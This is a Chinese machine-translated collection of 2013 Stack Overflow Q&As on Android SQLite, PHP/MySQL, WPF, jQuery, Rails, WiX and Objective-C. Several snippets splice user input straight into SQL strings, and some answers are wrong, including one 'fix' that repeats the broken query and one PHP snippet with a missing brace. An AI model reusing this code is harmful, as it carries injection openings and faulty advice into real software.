      DatabaseHelper(Context context) {
          super(context, DATABASE_NAME, null, DATABASE_VERSION);
      }

      @Override
      public void onCreate(SQLiteDatabase db) {
       Log.w(TAG, DATABASE_CREATE);
       db.execSQL(DATABASE_CREATE);
      }

      @Override
      public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
       Log.w(TAG, "Upgrading database from version " + oldVersion + " to "
         + newVersion + ", which will destroy all old data");
       db.execSQL("DROP TABLE IF EXISTS " + SQLITE_TABLE);
       onCreate(db);
      }
 }

 public TrackerDBAdapter(Context ctx) {
      this.mCtx = ctx;
 }

 public TrackerDBAdapter open() throws SQLException {
      mDbHelper = new DatabaseHelper(mCtx);
      mDb = mDbHelper.getWritableDatabase();
      return this;
 }

 public void close() {
      if (mDbHelper != null) {
       mDbHelper.close();
      }
 }

 public long createNewList(String idnum, String simnum, 
           String description, String model, String time) {

          ContentValues initialValues = new ContentValues();
          initialValues.put(KEY_IDNUM, idnum);
          initialValues.put(KEY_SIMCARD, simnum);
          initialValues.put(KEY_DESCRIPTION, description);
          initialValues.put(KEY_MODEL, model);
          initialValues.put(KEY_TIMEINSTANCE, time);
          return mDb.insert(SQLITE_TABLE, null, initialValues);
 }

 public boolean deleteAllTrackerInTheList() {

      int doneDelete = 0;
      doneDelete = mDb.delete(SQLITE_TABLE, null , null);
      Log.w(TAG, Integer.toString(doneDelete));
      return doneDelete > 0;
 }

 @SuppressLint("NewApi")
public Cursor fetchListBySimcardNum(String inputText) throws SQLException {
      Log.w(TAG, inputText);
      Cursor mCursor = null;
      if (inputText == null  ||  inputText.length () == 0)  {
       mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID,
               KEY_IDNUM, KEY_SIMCARD, KEY_DESCRIPTION, KEY_MODEL, KEY_TIMEINSTANCE}, 
         null, null, null, null, null);

      }
      else {
       mCursor = mDb.query(true, SQLITE_TABLE, new String[] {KEY_ROWID,
               KEY_IDNUM, KEY_SIMCARD, KEY_DESCRIPTION, KEY_MODEL, KEY_TIMEINSTANCE}, 
               KEY_SIMCARD + " like '%" + inputText + "%'", null,
         null, null, null, null);
      }
      if (mCursor != null) {
       mCursor.moveToFirst();
      }
      return mCursor;

  }

 @SuppressLint("NewApi")
public Cursor fetchListByIDNum(String inputText) throws SQLException {
      Log.w(TAG, inputText);
      Cursor mCursor = null;
      if (inputText == null  ||  inputText.length () == 0)  {
       mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID,
               KEY_IDNUM, KEY_SIMCARD, KEY_DESCRIPTION, KEY_MODEL, KEY_TIMEINSTANCE}, 
         null, null, null, null, null);

      }
      else {
       mCursor = mDb.query(true, SQLITE_TABLE, new String[] {KEY_ROWID,
               KEY_IDNUM, KEY_SIMCARD, KEY_DESCRIPTION, KEY_MODEL, KEY_TIMEINSTANCE}, 
               KEY_IDNUM + " like '%" + inputText + "%'", null,
         null, null, null, null);
      }
      if (mCursor != null) {
       mCursor.moveToFirst();
      }
      return mCursor;

  }

 public Cursor fetchAllTrackerInTheList() {

      Cursor mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID, 
              KEY_IDNUM, KEY_SIMCARD, KEY_DESCRIPTION, KEY_MODEL, KEY_TIMEINSTANCE}, 
        null, null, null, null, null);

      if (mCursor != null) {
       mCursor.moveToFirst();
      }
      return mCursor;
 }  

 public int getLastInsertedID() {
      int id = 0;
      Cursor mCursor = mDb.query(SQLITE_TABLE, new String[] {KEY_ROWID,
              KEY_IDNUM, KEY_SIMCARD, KEY_DESCRIPTION, KEY_MODEL, KEY_TIMEINSTANCE}, 
        null, null, null, null, null);

      if (mCursor.moveToLast()) {
          id = mCursor.getInt(0);
      }
      return id;
 }  

 public void insertSomeCountries() {

       createNewList("AFG","Afghanistan","Asia","Southern", "Central Asia");         

 } 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:32:10.770

数据库未更新。尝试删除您的应用并重新安装。

或者您可以更改数据库的版本：

```
 private static final int DATABASE_VERSION = 2; 
```

# jquery - 如何将带有jquery的css 3dtransform属性添加到dom元素？

> ID：15526262
> 
> 赞同：0
> 
> 时间：2013-03-20T14:24:43.303
> 
> 标签：jquery, css

您好我正在尝试使用 jquery 为 IOS 移动设备优化动画。我想考虑使用 3d 渲染引擎的这个已知问题！

现在我想做一些这样的转换：

```
$('.class').css({"-webkit-transform:":"translate3d(200px, 200px, 0px)"}); 
```

但这不起作用！没有添加CSS！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:34:14.113

我昨天发现了[Transit](https://github.com/rstacruz/jquery.transit)，如果您不介意添加库，您可能会发现它更容易。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:48:06.150

在不知道其余代码的情况下，您是否应用了`-webkit-transition`? 否则效果几乎会立即发生。

以下对我来说很好（工作 jsfiddle -> [http://jsfiddle.net/RQzn6/](http://jsfiddle.net/RQzn6/)）

HTML

```
<div id="container">
    <div id="box">Hello</div>
</div> 
```

CSS

```
#container {
    -webkit-transform-style: preserve-3d;
    -webkit-perspective: 100px;
}

#box {
    width: 200px;
    height: 100px;
    background-color: gray;
} 
```

jQuery

```
$("#box").click(function() {
    $(this).css({'-webkit-transform':'translate3d(200px, 200px, 0px)',
                 '-webkit-transition': 'all 1s ease-out'});
    }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:32:17.353

您是否忘记添加

```
-webkit-transform-style: preserve-3d;  ?? 
```

您还必须添加[preserve 3d](https://stackoverflow.com/questions/8835415/css3-transform-translate3d-doesnt-affect-the-z-axis)。

# asp.net - 如何使用 RenderAction 防止在视图上呈现多个通知

> ID：15526264
> 
> 赞同：1
> 
> 时间：2013-03-20T14:24:46.450
> 
> 标签：asp.net, .net, asp.net-mvc, asp.net-mvc-4, orchardcms

我有以下情况。
我正在控制器中设置`INotifier`通知，然后我将重定向到其他操作。在我重定向的视图中，我有一些 `Html.RenderAction`帮手。每次呈现操作时触发`NotifyFilter.OnResultExecuting(ResultExecutingContext filterContext)`并且每个方法调用消息设置为`tempData[TempDataMessages]`（保存通知消息的位置`NotifyFilter.OnActionExecuted(ActionExecutedContext filterContext)`都会添加新的消息条目。

我的控制器：

```
[HttpPost, ActionName("SomeAction")]
public ActionResult SomeActionPost()
{
  _notifier.Information(T("Important information"));
  return RedirectToAction("OtherAction", "MyController");
}

public ActionResult OtherAction()
{
  return View();
} 
```

和观点：

```
<div>
 @{ Html.RenderAction("ActionOne", "MyController");}
 @{ Html.RenderAction("ActionTwo", "MyController");}
</div> 
```

所以通知增加了三倍（一次`ActionResult OtherAction`，一次，一次，`ActionResult ActionOne`一次`ActionResult ActionTwo`。
有人知道如何防止额外的通知吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T15:13:14.707

我看不出这样做的简单方法。您可以尝试添加自己的操作过滤器并`TempData["messages"]`在某个时候清除该值，或者从您的父视图中执行此操作。不过，这两种解决方案都是解决方法，而且同样混乱。

顺便说一句 -`Html.RenderAction`应谨慎使用。除非您完全确定它的含义是什么，否则*不要使用它。*它在单个请求中处理多个操作。这很慢，迟早会让你遇到问题（比如你写的那个）。那里的大多数代码都假设在请求期间触发了一个操作。

如果你可以在没有它的情况下处理事情（在大多数情况下是可能的），那就去做吧。

# android - 我在 Android 应用程序中的 sqlite 查询出现问题

> ID：15526270
> 
> 赞同：-3
> 
> 时间：2013-03-20T14:24:55.830
> 
> 标签：android, sqlite

我的 Android 应用程序有问题。我正在尝试使用多个表查询数据库并在应用程序中显示结果。这是一本字典。问题是我的查询不起作用。我不知道我做错了什么。这是我用于它的代码示例。如果您需要更多信息，请告诉我。谢谢你。

```
try {

        Cursor cursor = dictionary.getDictionaryDatabase().rawQuery("SELECT index_nom_adresse" + word[0].toLowerCase().trim() + " FROM adresse_definition JOIN   definition ON adresse_definition.definition = definition.data_id ", null);
        //Cursor cursor = dictionary.getDictionaryDatabase().query("adresse_definition", null, "index_nom_adresse= '" + word[0].toLowerCase().trim() + "' or definition= '" + word[0].toUpperCase().trim() + "' ", null, null, null, null);
        cursor.moveToFirst();
        if (cursor.getCount() != 0) {

            if (word[1] == null || word[1].equals("English")) {
                translatedWord = cursor.getString(2);
            } else {
                translatedWord = cursor.getString(1);
            }
        } else {
            translatedWord = "The word is not in database";
        }
        cursor.close();
    } catch (SQLiteException sqle) {
        translatedWord = "The word is not in database";
    } 
```

这是我在尝试搜索单词时得到的 logCat

```
03-20 14:34:17.341: I/SqliteDatabaseCpp(516): sqlite returned: error code = 1, msg = no such column: index_nom_adressebonbon, db=/data/data/com.example.application/databases/dict.db 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:28:07.683

查询应该是：

```
 Cursor cursor = dictionary.getDictionaryDatabase().rawQuery("SELECT index_nom_adresse" + word[0].toLowerCase().trim() + " FROM adresse_definition JOIN   definition ON adresse_definition.definition = definition.data_id ", null); 
```

否则没有正确定义库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T16:29:45.840

首先，您通过捕获`Exception`然后说“该词不在数据库中”来隐藏真正的错误。由于您提供的信息量有限，您可能遇到的问题只是猜测，正在传递`SELECT`, 而不是`WHERE`从句中的单词。

您的 SQL 查询可能需要是这样的：

```
SELECT index_nom_adresse
FROM adresse_definition 
JOIN definition ON adresse_definition.definition = definition.data_id
WHERE index_nom_adresse = word[0].toLowerCase().trim() OR definition = word[0].toUpperCase().trim() 
```

这转化为：

```
String sql = "SELECT index_nom_adresse ";
sql += "FROM adresse_definition JOIN definition ON adresse_definition.definition = definition.data_id ";
sql += "WHERE index_nom_adresse = " + word[0].toLowerCase().trim() " OR definition=" + word[0].toUpperCase().trim();
Cursor cursor = dictionary.getDictionaryDatabase().rawQuery(sql, null); 
```

或（更好的解决方案）（不知道您将如何进行连接，是否`JOIN`需要？）

```
Cursor cursor = dictionary.getDictionaryDatabase().query(
    "adresse_definition", 
    new String[] {"index_nom_adresse"}, 
    "index_nom_adresse= ? OR definition=?'", 
    new String[] {word[0].toLowerCase().trim(), word[0].toUpperCase().trim()}, 
    null, 
    null, 
    null); 
```

请阅读 Android 和 SQL：[http ://www.vogella.com/articles/AndroidSQLite/article.html](http://www.vogella.com/articles/AndroidSQLite/article.html)

我这里没有工具来验证代码，如果有错误请评论或编辑。

# wix - 错误 LGHT0204: ICE57: 组件具有每用户和每机器数据以及每机器 KeyPath

> ID：15526271
> 
> 赞同：2
> 
> 时间：2013-03-20T14:24:58.163
> 
> 标签：wix, registry

嗨，我收到以下错误，导致构建失败，但在 bin 中创建了 Wix Installer MSI。我怎样才能避免这些错误或抑制？

错误 LGHT0204：ICE57：组件 'cmp52CD5A4CB5D668097543295CE11F998C' 具有每用户和每机器数据以及每机器 KeyPath。

```
<Component Id="cmp52CD5A4CB5D668097543295CE11F998C" Directory="dir61E1488DA838A25DC7BC0F573A0FB3CD" Guid="*">
                <Class Id="{017F9D47-1C89-3448-8C8F-531717713535}" Context="InprocServer32" Description="ComponentArt.Web.UI.CustomAttributeMappingCollection" ThreadingModel="both" ForeignServer="mscoree.dll">
                    <ProgId Id="ComponentArt.Web.UI.CustomAttributeMappingCollection" Description="ComponentArt.Web.UI.CustomAttributeMappingCollection" />
                </Class> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T15:24:22.837

要解决警告消失，请确保它`dir61E1488DA838A25DC7BC0F573A0FB3CD`植根于每台机器`Directory`，例如`ProgramFilesFolder`.

# php - 使用php计算一个值在sql查询中出现的次数

> ID：15526277
> 
> 赞同：0
> 
> 时间：2013-03-20T14:25:07.813
> 
> 标签：php, sql

我创建了一个数据库和网站，足球经理将使用它们来选择他们的球队等。一旦比赛完成，事件将存储在 `match_players`表格中。此类事件是目标、黄牌、红牌等。我可以毫无问题地将这些信息从 SQL 数据库导入 php。

我需要将目标出现的次数（在 SQL 表中放置“1”）和哪个团队加起来，以便显示最终得分。因此，例如，如果 A 队有 1 个目标，B 队有 2 个目标，那么我需要显示它。我正在尝试计算目标在表中注册的次数。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:27:18.127

你可以使用MYSQL`SUM`

```
select SUM(Goal) from match_players where Team="A" 
```

或者您可以通过以下方式为所有团队获得相同的结果

```
select Team,SUM(Goal) from match_players group by Team 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:27:54.893

为什么不直接向 SQL 索取这笔款项呢？

```
SELECT SUM(goals)
FROM match_table
WHERE team = 'Barcellona' 
```

这也应该比在“php 级别”详细说明所有数据要快得多

如果您想为所有团队提供此详细信息

```
SELECT team,SUM(goals)
FROM match_table
GROUP BY team 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:30:46.153

好吧，如果您在每次进球时存储一个 1，那么您的表格如下所示：

```
TeamID  goal
   1     1
   2     1
   1     1
   3     1
   2     1
   2     1
   1     1 
```

因此，您只需要计算一个团队在该表中出现的次数：

```
select TeamID, count(*) from table group by TeamID 
```

会给你

```
 TeamID | count(*)
     1  |  3
     2  |  3
     3  |  1 
```

# c# - 访问修饰符 VS 属性

> ID：15526279
> 
> 赞同：0
> 
> 时间：2013-03-20T14:25:13.230
> 
> 标签：c#, asp.net, class, properties, access-modifiers

访问修饰符的目的是隐藏数据成员免受未经授权的访问。而 Properties 的目的是公开访问修饰符。访问修饰符的目的消失了。以下是示例。

```
public class Employee
{
    private int EmployeeID;
    private string Name;
    private int Salary;

    public int EID { get { return this.EmployeeID; } set { this.EmployeeID = value; } }
    public string EName { get { return this.Name; } set { this.Name = value; } }
    public int ESalary { get { return this.Salary; } set { this.Salary = value; } }
}

static void Main(string[] args)
{
    Employee Employee = new Employee();
    Employee.EName = "Zaheer";
} 
```

在这里我可以访问间接访问名称的属性 EName。如果问题很愚蠢，请发表任何评论并抱歉。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:28:51.380

你理解的有点不对。属性是数据成员，访问修饰符是修改对数据成员的访问权限的修饰符。属性可以从外部访问，因为它们具有“公共”访问修饰符。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T14:55:42.810

私有字段的想法并不是说无论如何都无法通过类型外部的某些东西来修改该值。如果这是真的，它们将完全没有用。私有字段的想法是禁止从类型外部*直接*访问成员本身，但可以通过一定数量的非私有成员允许有限程度的间接访问。与公共访问相比，这些公共成员将提供一些更有限的访问该领域的方法。

在您的特定示例中，确实没有太多限制；任何拥有实例的人都可以随时访问该值，或者任何拥有实例的人都可以随时设置该值。它仍然比公开公开字段更受保护，例如您不能通过`ref`方法上的参数直接创建对该字段的引用，但是您可以说添加的保护很少。当外部实体修改字段的能力以某种方式受到限制时，它变得更加有用。也许它可以获取值而不设置它，也许某些值根本无法设置，也许它会在调用方法时以任何外部实体从未直接指定的方式改变自己。

归根结底，方法/属性的定义将决定对底层字段的访问级别。这种访问级别可以从几乎完全到几乎没有。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:33:27.460

属性实际上是返回和设置字段值的方法的语法糖。因此，它们有几个优点：

1.  属性可以执行额外的检查。`EID`例如，您可以捕获设置为负值或`EName`空字符串的尝试。
2.  属性可以一次设置多个字段，以保持对象内部数据的一致性。
3.  属性可以在接口中使用，而字段不能。
4.  属性可以有单独的 getter 和 setter 访问修饰符。

但是，设置字段更有效，因为它没有调用方法的开销。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T14:34:23.260

您的示例属性都非常简单，可以用自动属性替换。属性用于控制对字段的访问，而不仅仅是公开该字段。

例如，如果您有一个名为 的属性`EmailAddress`，您可能希望在分配正确的电子邮件地址之前检查该值。您可以在属性的设置器中处理它并拒绝任何无效值。当你直接公开一个字段时，你无法在你的类中控制它。

这是属性的明显用途之一，但与使用字段相比，还有其他用途和优势。

# search - 如何使 Elasticsearch 模糊_like_this 将 like_text 标记视为 AND 而不是 OR？

> ID：15526281
> 
> 赞同：3
> 
> 时间：2013-03-20T14:25:22.497
> 
> 标签：search, full-text-search, elasticsearch, fuzzy-search

与“query_string”运算符不同，“fuzzy_like_this”没有“default_operator”，我可以将其设置为“AND”，这导致结果集比“chicken Breast”等多词搜索所需的结果集大得多。

是否有替代方法来完成此功能？就像预先分割搜索标记并将一堆fuzzy_like_this 块合并在一起？或者最好是更简单、更直观的东西？

[http://www.elasticsearch.org/guide/reference/query-dsl/flt-query.html](http://www.elasticsearch.org/guide/reference/query-dsl/flt-query.html)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T03:54:23.177

除非我错过了您的要求中的某些内容，否则您正在寻找的是[match_query](http://www.elasticsearch.org/guide/reference/query-dsl/match-query.html)。它支持 AND 运算符，这将要求所有术语与记录匹配。或者，您可以使用参数指定必须匹配的术语的数量或百分比`minimum_should_match`。

# ios - 选项卡式应用程序 - 如何隐藏选项卡栏

> ID：15526286
> 
> 赞同：0
> 
> 时间：2013-03-20T14:25:48.530
> 
> 标签：ios

总菜鸟问题，我搜索了所有帖子，但不明白如何做到这一点。使用带有 3 个视图控制器的“选项卡式应用程序”模板创建了一个应用程序，但我没有使用导航控制器。按下按钮时试图隐藏第一个屏幕上的标签栏。我见过的所有解决方案都使用 hidesBottomBarWhenPushed = YES，但是这个明显的只有当视图与导航控制器一起使用时才有效？是否有某种方法可以仅从选项卡式应用程序中的视图控制器完成此操作？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T14:33:33.390

您可以使用此代码隐藏 tabBar

```
self.tabBarController.tabBar.hidden =YES; 
```

# ruby-on-rails - act_as_taggable_on_steroids 中的错误 - tags_counts 方法

> ID：15526288
> 
> 赞同：0
> 
> 时间：2013-03-20T14:25:50.977
> 
> 标签：ruby-on-rails, ruby-on-rails-3

tag_count 方法为我的 GroupsController 中的所有记录提供相同的值：

```
 @group_blog_tags=@group.blog.blog_posts.tag_counts 
```

在哪里

```
 class Group < ActiveRecord::Base
      has_one :blog, :as => :owner, :dependent => :destroy

      class Blog < ActiveRecord::Base
          has_many :blog_posts, :order => "blog_posts.created_at desc", :dependent => 
            :destroy 
```

但无论我选择哪个组，它总是获取标签表中的第一条记录。

我究竟做错了什么？

```
@group=Group.find(45)  => #<Group id: 45, name: "Royal P&O Princess", description:                        
        "Royal P&O Princess the next edit", created_at: "2013-03-04 06:04:57", 
        primary_photo_id: 807, updated_at: "2013-03-14 07:33:37", tags: "Caribbean, 
        Nile, Mediterranean", group_memberships_count: 2, group_type: 1, 
        last_updated_by: 1, content_updated_at: "2013-03-04 11:05:08", activity_points: 
        0, activity_status: 0, no_memberships_on: nil, owner_id: 28, sponsor_account_id: 
        65, views: 241, company_id: 0, active: 1, de_flag:0  

@group.blog.blog_posts => [#<BlogPost id: 12, created_at: "2013-03-20 05:08:56", 
       updated_at: "2013-03-20 05:08:56", blog_id: 74, creator_id: 1, title: "South 
       African Sojourn", text: "<p>\r\n\tSouth African Sojourn</p>\r\n", comments_count: 
       0, created_at_year_month: 201303, cached_tag_list: "Africa, Veldt", rating_count: 
       0, rating_total: 0, rating_avg: #<BigDecimal:b2de1978,'0.0',4(8)>, views: 1, 
       source: nil, link: nil, guid: nil, tagline: nil, creator_type: "Profile", 
       num_positive_votes: 0, num_negative_votes: 0, net_helpful: 0, best_image: nil, 
      active: 1>, #<BlogPost id: 11, created_at: "2013-03-20 03:46:07", updated_at: 
      "2013-03-20 03:46:07", blog_id: 74, creator_id: 1, title: "African safari", text: 
       "<p>\r\n\tAfrican safari&nbsp;Africa, Safari&nbsp;Afric...", comments_count: 0, 
       created_at_year_month: 201303, cached_tag_list: "Africa, Safari, Veldt", 
       rating_count: 0, rating_total: 0, rating_avg: #<BigDecimal:b2de1518,'0.0',4(8)>, 
       views: 1, source: nil, link: nil, guid: nil, tagline: nil, creator_type: 
       "Profile", num_positive_votes: 0, num_negative_votes: 0, net_helpful: 0, 
       best_image: nil, active: 1>, #<BlogPost id: 2, created_at: "2013-03-04 06:34:53", 
      updated_at: "2013-03-04 06:34:53", blog_id: 74, creator_id: 28, title: "New blog 
       post", text: "<p>\r\n\tNew blog post</p>\r\n", comments_count: 4, 
      created_at_year_month: 201303, cached_tag_list: "New blog post", rating_count: 0, 
       rating_total: 0, rating_avg: #<BigDecimal:b2de1414,'0.0',4(8)>, views: 7, source: 
       nil, link: nil, guid: nil, tagline: nil, creator_type: "Profile", 
       num_positive_votes: 1, num_negative_votes: 0, net_helpful: 1, best_image: nil, 
       active: 1>]  

       @group.blog.blog_posts.tag_counts          => [#<Tag id: 1, name: "acticity 
     stream message">]     

       Trying another group:
       Group.find(40).blog.blog_posts.tag_counts  => [#<Tag id: 1, name: "acticity 
       stream message">] 
```

它总是获取与结果相同的记录！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:42:09.247

我认为一个组“belongs_to”是一个博客，而不是“has_one”。

*编辑*

您必须指定组和博客之间的关系。可能是这种情况：

*   一个群有_一个博客，一个博客属于一个群
*   一个群有_许多博客，一个博客属于_一个群
*   一个群属于_一个博客，一个博客有_一个群
*   一个群属于_一个博客，一个博客有_多个群
*   一个组 has_one_and_belongs_to_many 个博客，一个博客 has_one_and_belongs_to_many 个组

A`x belongs_to y`意味着你的桌子上有`y_id`一个`x`。

A`x has_one y`或`x has_many y`指定`y`每个的数量`x`。

A`x has_and_belongs_to_many y`暗示`x`有 many`y`和`y`has_many `x`。

# wpf - 在 WPF 列表框中选择项目时显示刻度图像

> ID：15526289
> 
> 赞同：2
> 
> 时间：2013-03-20T14:25:51.230
> 
> 标签：wpf, image, listbox

我有这个简单的 ListBox，它显示水平和垂直的图像列表。我还在每个图像上添加了一个刻度图像。现在我想仅在列表框中选择该项目时启用此刻度图像。

我怎样才能做到这一点？

列表框 XAML：

```
 <ListBox x:Name="PhotoCollection"
         Grid.Row="2"
         Grid.ColumnSpan="4"
         ItemsSource="{Binding PhotoCollection, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}"
         ScrollViewer.HorizontalScrollBarVisibility="Disabled"
         SelectionMode="Multiple">
  <ListBox.ItemTemplate>
    <DataTemplate>
      <StackPanel Orientation="Vertical">
        <Border BorderBrush="White"
                BorderThickness="2"
                Margin="5"
                Background="LightGray">
          <Grid>
          <Image Source="{Binding}"
                 Stretch="Uniform"
                 Width="50"
                 Height="50"
                 Margin="5" />
            <Image Source="{StaticResource Check_24}"
                   Visibility="{Binding Converter={StaticResource VisibleConverter}, RelativeSource={RelativeSource Mode=FindAncestor, AncestorType={x:Type ListBoxItem}, AncestorLevel=1},Path=IsSelected}"
                   Stretch="Uniform"
                   Width="20"
                   Height="20"
                   Margin="5" 
                   HorizontalAlignment="Right"
                   VerticalAlignment="Bottom"/>
          </Grid>
        </Border>
      </StackPanel>
    </DataTemplate>
  </ListBox.ItemTemplate>
  <ListBox.ItemsPanel>
    <ItemsPanelTemplate>
      <WrapPanel IsItemsHost="True"
                 Orientation="Horizontal" />
    </ItemsPanelTemplate>
  </ListBox.ItemsPanel>
</ListBox> 
```

**编辑：**这条线可以解决问题

```
Visibility="{Binding Converter={StaticResource VisibleConverter}, RelativeSource={RelativeSource Mode=FindAncestor, AncestorType={x:Type ListBoxItem}, AncestorLevel=1},Path=IsSelected}" 
```

![勾选所有图像，但应仅在选定图像上处于活动状态。](../Images/398b7ef3cd55d1f3f31e202d2c998d47.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:46:53.817

`IsSelected`当您将 的属性绑定`ListBoxItem`到您的属性时，它应该可以工作`IsVisible`。但这取决于您如何实现 ViewModel 和属性。

```
<ListBox>
  <!-- the rest of the XAML-Definition of your ListBox -->
  <ListBox.ItemContainerStyle>
    <Style TargetType="ListBoxItem">
      <Setter Property="IsSelected" Value="{Binding IsVisible, Mode=TwoWay}"/>
    </Style>
  </ListBox.ItemContainerStyle>
</ListBox> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:54:19.270

当我需要将项目的可见性绑定到布尔值时，我一直在使用转换器类：

```
public class BoolToVisibleOrHidden : IValueConverter {
        public BoolToVisibleOrHidden() { }
        public bool Collapse { get; set; }
        public bool Reverse { get; set; }
        public object Convert(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture) {
            bool bValue = (bool)value;
            if (bValue != Reverse) {
                return Visibility.Visible;
            } else {
                if (Collapse)
                    return Visibility.Collapsed;
                else
                    return Visibility.Hidden;
            }
        }

        public object ConvertBack(object value, Type targetType, object parameter, System.Globalization.CultureInfo culture) {
            Visibility visibility = (Visibility)value;
            if (visibility == Visibility.Visible)
                return !Reverse;
            else
                return Reverse;
        }
    } 
```

在 XAML 中抓取它的一个实例后，如下所示：

```
<local:BoolToVisibleOrHidden x:Key="BoolToVisConverter" Collapse="True" /> 
```

我可以绑定这样的项目的可见性：

```
Visibility="{Binding Converter={StaticResource BoolToVisConverter}, Path=DataContext.PATHTOBOOLEAN}" 
```

# php - PHP mysql_affected_rows() 我应该关心吗？

> ID：15526290
> 
> 赞同：0
> 
> 时间：2013-03-20T14:25:52.417
> 
> 标签：php, mysql

在我的 PHP INSERT/UPDATE 代码中，我一直在为一个相当基本的概念而苦苦挣扎。我是否应该在每次插入/更新后始终检查受影响的行数，因为在绝大多数情况下，我只执行一次插入/更新，而且它似乎导致的问题比通过检查只有一行受到影响来解决的问题更多.

下面是我执行 INSERT/UPDATE 的标准代码，如果用户在不更改任何内容的情况下更新记录，则此代码将失败，因为受影响的行将为 0。我可以编写代码来检查至少一个字段已更改但在大型表单上这看起来很笨拙，想知道它是否真的值得，因为无论如何我从来没有真正通过检查这个数字来发现任何错误。

```
<?php
        $whereSql = '';
        $groupSql = 'INSERT INTO';

        if(isset($_POST['id']) && is_numeric($_POST['id'])){
            $groupSql = 'UPDATE';
            $whereSql = 'WHERE id = ' . $_POST['id'];
        }

        $groupSql .= ' sometable SET name="' . $name . '" ' . $whereSql;

        $groupDb = mysqli_query($groupSql, $dbObject) or die("Login DB error:".mysql_error());

        if(mysqli_affected_rows($dbObject) == 1){
            //redirect
        }else{
            die('System Error');
        } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T14:31:10.407

您应该检查查询的返回值。不影响/不返回任何行的选择/更新查询**不是**错误条件，它只是一个空结果集，或者碰巧没有影响的更新。

```
$result = mysql_query($sql) or die(mysql_error());
                            ^^^^^^^^^^^^^^^^^^^^^ 
```

考虑一个用户注册系统，它检查是否存在匹配的用户名：

```
SELECT id FROM users WHERE username='foo'; 
```

如果用户`foo`不存在，您的系统将发出错误并声称发生了错误。但是空的结果集**不是**错误。它只是意味着用户名可供用户使用。

对于处理成绩的系统也是如此：

```
UPDATE students SET failed=true WHERE score < 50; 
```

获得 0 个受影响的行不是失败。这只是意味着所有学生都通过了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:31:40.333

我建议检查查询是否失败，如果没有，那么是否有不止一行受到影响。

```
$groupDb = mysql_query($groupSql, $dbObject);
if (false === $groupDb) {
    die("Login DB error:".mysql_error())
if (mysql_affected_rows($dbObject) > 1) {
    die('System Error: failed to ' . $action . ' a  document Group');
} else {
    //redirect
} 
```

这样，只有在查询成功并且受影响的行少于 2 行（如果这对您很重要）的情况下，您才会重定向。

# objective-c - 如何在 Objective-C 中创建数字数组？

> ID：15526297
> 
> 赞同：0
> 
> 时间：2013-03-20T14:25:59.040
> 
> 标签：objective-c, c

我试图创建我的 iphone 程序，我意识到制作 2 个暗淡的数组或矩阵对我来说很困难...... :-(

*我如何以及在哪里声明这样的事情（取自java），所以所有函数都可以看到它：

```
int[] myArray = new int[6]; 
```

*我怎样才能实现这个功能：

```
 public  int[] sortArray (int[] myArray){
  int tmp;
  for (int x = 0; x < myArray.length; x++) {
   for (int y = x+1; y < 6; y++) {
    if (myArray[y] < myArray[x]) {
     tmp = myArray[x];
     myArray[x] = myArray[y];
     myArray[y] = tmp;
    }
   }
  }
  return myArray;
 } 
```

*我如何调用这个函数？

```
sortArray(myArray); 
```

谢谢大家！！！沙龙

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T14:35:57.947

你可以用一行代码做到这一点：

```
NSArray *array = @[@[@1, @2, @3],
                   @[@4, @5, @6],
                   @[@7, @8, @9]]; 
```

[在此处](http://clang.llvm.org/docs/ObjectiveCLiterals.html)了解 Objective-C 文字。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T14:31:37.410

和 C 一样，

```
int twoDArray[3][3]; 
```

在客观-C

```
NSArray *a=@[@"apple",@"axe",@"ant"];
NSArray *b=@[@"ball",@"book",@"baby"];
NSArray *c=@[@"cup",@"cat",@"cow"];

NSArray *twoDArray=@[a,b,c]; 
```

或在一个声明中：

```
NSArray *twoDArray=@[@[@"apple",@"axe",@"ant"],
                     @[@"ball",@"book",@"baby"],
                     @[@"cup",@"cat",@"cow"]]; 
```

* * *

编辑：

无需将该 java 函数转换为 obj-c 方法。

**对数组进行排序**：

```
NSArray *sortedArray = [array sortedArrayUsingComparator:^(id str1, id str2) {
    return [((NSString *)str1) compare:((NSString *)str2) options:NSNumericSearch];
}]; 
```

编辑 2：（删除了不需要的 nsstring 类型转换为 id 并返回到字符串）

```
NSArray *sortedArray = [array sortedArrayUsingComparator:^(NSString *str1, NSString *str2) {
    return [str1 compare:str2 options:NSNumericSearch];
}]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-20T14:35:50.390

在您各自的 .h 文件中声明

```
NSMutableArray *numbers; 
```

然后在你的 .m 文件中

```
numbers = [[NSMutableArray alloc] init];

 for (NSInteger i = 0; i < 6; i++)
